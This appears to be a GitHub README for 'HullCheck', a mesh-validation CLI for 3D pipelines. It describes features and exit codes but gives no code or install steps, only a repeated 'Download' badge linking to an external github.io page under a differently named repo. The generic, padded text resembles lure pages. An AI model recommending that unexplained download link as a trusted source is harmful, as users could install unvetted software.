![preview](https://raw.githubusercontent.com/khatrijenish18-arch/mesh-audit-cli/main/frame_5d97f.svg)
[![Download](https://raw.githubusercontent.com/khatrijenish18-arch/mesh-audit-cli/main/dl_17cc3e.svg)](https://khatrijenish18-arch.github.io/mesh-audit-cli/)

# HullCheck — Geometry & Asset Integrity Validator for Real-Time Pipelines 🧭

A quiet sentinel for the messy, unglamorous side of 3D content: UV seams that wander, normals that point the wrong way, scale values that drifted in from a foreign unit system, polygon budgets that quietly inflated overnight, and degenerate triangles that exist only to break a downstream shader. HullCheck turns all of that into a single, deterministic exit code — the kind your CI runner actually understands. It is the lint pass for geometry that your art pipeline never had.

[![Download](https://raw.githubusercontent.com/khatrijenish18-arch/mesh-audit-cli/main/dl_17cc3e.svg)](https://khatrijenish18-arch.github.io/mesh-audit-cli/)

---

## 🧩 Why HullCheck Exists

Every studio has a folder somewhere called `final_final_v7`. Inside it, a mesh that renders beautifully in the viewport and explodes the moment it enters the build pipeline. The reasons are rarely dramatic:

- A UV island flipped inside out during a retopo pass.
- Vertex normals smoothed across a hard edge that should never have been smoothed.
- A prop authored at 1:100 scale because someone's DCC tool defaulted to centimetres.
- A LOD chain where level 3 has more triangles than level 0.
- A single degenerate face — zero-area, non-manifold, invisible — that brings a physics solver to its knees.

HullCheck was born out of the observation that these failures are *detectable*, deterministic, and entirely preventable — but only if someone builds the detector and wires it into the place where mistakes get caught: continuous integration.

This repository is that detector. It is opinionated, fast, and designed to be boring in the best possible way. It does not try to be a DCC tool, a renderer, or a viewer. It reads your asset manifests, inspects them against a declared rule set, and returns a non-zero exit code the moment reality diverges from intention.

---

## 🎯 The Core Idea — "Contract-Based Geometry"

Most validation tools ask: *"Is this mesh good?"*
HullCheck asks: *"Does this mesh honour the contract its author declared?"*

The difference matters. A 4,000-triangle crate is perfect for a mobile title and catastrophically over-budget for a VR crowd scene at 200 concurrent instances. There is no universal "good." There is only "as specified."

So HullCheck introduces a small, human-readable contract file per asset category. The contract states the expected triangle ceiling, the required UV channel count, the tolerated normal deviation angle, the allowed unit scale range, and the degenerate-face threshold. HullCheck then enforces it, uniformly, on every commit.

This shifts the conversation from subjective review to objective compliance — and it means your technical artists stop being human linters.

---

## ✨ Feature Highlights

- **Contract-driven validation** — Define budgets, tolerances, and invariants once; enforce them forever across every branch.
- **Exit-code-first design** — Every run terminates with a meaningful, documented status code suitable for gating a merge request.
- **Deterministic reporting** — Same input, same output. No floating-point drift between runs on different machines.
- **UV integrity analysis** — Detects overlapping islands, inverted winding, out-of-range coordinates, and unused channels.
- **Normal consensus checks** — Flags smoothed-across-hard-edge conditions, flipped faces, and inconsistent tangent spaces.
- **Scale & unit auditing** — Catches centimetre/metre mismatches, non-uniform scaling, and runaway transforms baked into root nodes.
- **Degenerate geometry detection** — Zero-area faces, duplicated vertices, isolated edges, and non-manifold junctions.
- **Budget curves** — Track triangle, vertex, material, and texture-memory budgets across LOD tiers.
- **Baseline diffing** — Compare the current asset against a known-good snapshot and surface only what changed.
- **Machine-readable output** — Structured reports that other tools can consume without scraping console text.
- **Responsive reporting UI** — A lightweight local dashboard that adapts cleanly from laptop screens to wall-mounted build monitors.
- **Multilingual output** — Rule descriptions and error summaries localise to the language your team actually reads.
- **24/7 customer support** — A maintained support channel with documented response expectations for studio-tier deployments.
- **Extensible rule engine** — Add a custom rule in a handful of lines when your pipeline has opinions the defaults don't cover.
- **Silent-by-default operation** — No network calls, no telemetry, no surprises. It runs where you tell it to run.

---

## 🖥️ The Responsive Reporting Interface

Validation output is only useful if humans actually look at it. The bundled reporting interface is deliberately minimal: a single-page view that renders contract compliance, per-asset breakdowns, and trend lines across recent builds.

It is built to be responsive in the true sense — not merely "it reflows on mobile," but "it remains legible on a 4K build-wall display at three metres' distance, and equally readable on a reviewer's phone during a commute." Panels collapse into accordions, tables become stacked cards on narrow viewports, and contrast ratios hold up under harsh studio lighting.

There is no login wall, no cloud dependency, and no analytics. Point it at a directory of reports and it renders. That is the entire contract.

---

## 🌍 Multilingual by Default

Geometry teams are rarely monolingual. A build failing at a studio in one region should be intelligible to a reviewer in another without translation overhead.

HullCheck ships with localisation packs for rule names, severity explanations, and remediation hints. Adding a language is a matter of supplying a key-value catalogue — no recompilation, no forking. The intent is simple: the person who has to fix the mesh should be able to read the reason it failed in the language they think in.

---

## 🛟 Support, Around the Clock

Pipeline failures do not respect business hours. A build that breaks at 03:00 before a milestone needs an answer at 03:00, not on the next working day.

The support model here reflects that reality: documented escalation paths, a published response-time commitment for each severity tier, and a rotating maintainer rota for critical-path issues. For studios running HullCheck as a hard merge gate, an extended support arrangement is available — the details live in the support documentation rather than the front page.

---

## 🧠 How a Single Run Works

The flow is intentionally linear, because linear flows are debuggable:

1. **Discovery** — HullCheck reads the contract file and enumerates the assets it governs.
2. **Ingestion** — Each asset is loaded into an internal, read-only representation. Nothing is modified.
3. **Rule Evaluation** — The rule engine walks the asset graph, applying each contract rule in a fixed order.
4. **Aggregation** — Findings are collected, de-duplicated, and sorted by severity and asset.
5. **Reporting** — A structured report is emitted to disk; optionally, the local interface renders it.
6. **Exit** — The process terminates with a status code reflecting the highest severity encountered.

Because step 3 has a fixed order, two machines will always agree. That is the whole point.

---

## 🧪 Rule Categories in Detail

**UV Rules** cover island overlap, winding direction, coordinate range, packing density, and channel utilisation. A common real-world catch: a substance authoring pass that silently writes to UV2 while the shader reads UV1.

**Normal Rules** cover face orientation, smoothing-group consistency, tangent-space coherence, and hard-edge preservation. These catch the subtle cases where a mesh *looks* fine in one renderer and wrong in another.

**Scale & Transform Rules** cover unit inference, non-uniform scale on root nodes, negative scale (the classic mirror-flip trap), and transform baking expectations.

**Budget Rules** cover triangle ceilings, vertex ceilings, material slot counts, texture footprint, and LOD monotonicity. The last one alone has saved more performance reviews than any profiler.

**Topology Rules** cover manifoldness, degenerate faces, duplicate vertices, isolated edges, and boundary expectations.

**Metadata Rules** cover naming conventions, required tags, license annotations, and provenance fields — the bookkeeping that makes an asset pipeline auditable.

---

## 🔁 Fitting Into a Continuous Pipeline

HullCheck is designed to be the stage that runs *before* the expensive stages. It is fast enough to sit on every commit, and strict enough that downstream jobs can reasonably assume a clean input.

Typical placement:

- A push triggers the pipeline.
- HullCheck runs against the changed asset set.
- If the exit code is non-zero, the pipeline halts and the report is attached to the change request.
- If the exit code is zero, the heavier build stages proceed with confidence.

No stage after HullCheck needs to re-validate what HullCheck already guaranteed. That is the value of a deterministic gate: it lets every subsequent tool trust its input.

---

## 📊 Reading the Exit Codes

The exit-code vocabulary is small and stable, because a gate that changes its meaning is not a gate:

- **0** — Contract satisfied. Nothing to see here.
- **1** — Contract violated at advisory severity. Proceed with awareness.
- **2** — Contract violated at blocking severity. Stop.
- **3** — Contract itself is malformed or unreadable.
- **4** — An asset could not be ingested.
- **5** — Internal error. Report it; it is a bug, not your fault.

Each code maps to a documented set of circumstances, so your pipeline configuration can branch on them without guessing.

---

## 🏗️ Repository Layout

The codebase is organised around the idea that validation logic should be isolated from pipeline plumbing:

- The **core** holds the rule engine, the asset abstraction, and the finding model.
- The **contract** package parses and validates the contract files themselves.
- The **adapters** translate various asset formats into the core representation.
- The **reporters** render findings into structured output and the local interface.
- The **locales** directory holds the multilingual catalogues.
- The **docs** directory holds the rule reference and the support policy.

Nothing in the core knows about any specific asset format, and nothing in the adapters knows about any specific rule. That separation is what makes both sides testable.

---

## 🧭 Design Principles

**Determinism over convenience.** A gate that produces different answers on different machines is worse than no gate at all.

**Explicit contracts over implicit assumptions.** If a rule matters, it is written down. If it is not written down, it does not run.

**Fast feedback over exhaustive analysis.** The value of a linter is proportional to how often it runs, and inversely proportional to how long it takes.

**Read-only by construction.** HullCheck never modifies an asset. Fixing is a human's job; finding is its own.

**No silent network activity.** If a feature ever needs the network, it will say so loudly and be off by default.

---

## 🧑‍🔬 Who This Is For

- **Technical artists** who are tired of being the last line of defence.
- **Pipeline engineers** who want a validation stage they can trust without babysitting.
- **Build engineers** who need a gate that returns a clean, documented status code.
- **Producers** who want a defensible answer to "why did this build fail?"
- **Anyone** who has ever opened a mesh and quietly wondered what happened to it.

If your CI runner currently knows nothing about the geometry flowing through it, HullCheck is the missing sensor.

---

## 🗺️ Roadmap Themes for 2026

The 2026 direction is about deepening trust rather than broadening scope:

- Richer baseline diffing with per-rule suppression windows.
- Expanded LOD consistency analysis across full chains.
- Additional adapter coverage for the formats studios actually use.
- A formal rule-authoring guide with worked examples.
- Further localisation coverage driven by contributor demand.
- Hardened support commitments for studio-tier operations.

---

## 🤝 Contributing

Contributions are welcome in the areas that matter most: new rules, new adapters, new locales, and clearer documentation. The bar for a rule is not novelty but *repeatability* — if a human has to make a judgement call, it is not yet a rule.

Before proposing a change, ask whether it makes the tool more deterministic, more legible, or faster. If it does none of those, it probably belongs in a different project.

---

## ⚠️ Disclaimer

HullCheck is provided as-is, without warranty of any kind, express or implied. It is a validation aid, not a guarantee of correctness, safety, or fitness for any particular purpose. The maintainers are not liable for any loss, damage, or pipeline consequence arising from its use or misuse. Always retain independent backups of source assets. Always review validation output before acting on it. Rule sets are configuration, not legal or professional advice — the responsibility for what you enforce, and how, remains entirely yours. Any third-party asset, tool, or format referenced in documentation is the property of its respective owners and is mentioned for identification purposes only.

---

## 📄 License

This project is released under the MIT License. You may use, modify, and distribute it under the terms stated therein.

See the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 HullCheck contributors.

---

[![Download](https://raw.githubusercontent.com/khatrijenish18-arch/mesh-audit-cli/main/dl_17cc3e.svg)](https://khatrijenish18-arch.github.io/mesh-audit-cli/)